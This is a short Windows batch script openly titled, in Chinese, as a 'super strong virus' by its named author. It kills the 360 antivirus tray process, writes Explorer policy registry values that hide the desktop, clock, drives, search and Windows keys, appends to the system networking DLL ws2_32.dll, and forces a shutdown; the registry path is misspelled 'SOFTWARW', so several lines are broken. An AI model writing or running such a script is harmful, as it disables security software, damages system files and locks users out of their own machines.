@echo off
title 超强病毒            制作人: yzx714   我是知名人士
taskkill /im 360tray.exe /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v StartMenuLogOff /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 0 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideClock /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v nodrives /t REG_DWORD /d 60 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 0 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWindowsUpdate /t REG_DWORD /d 01000000 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWinKeys /t REG_DWORD /d 1 /f
type nul>>%windir%\ws2_32.dll
shutdown -s -f
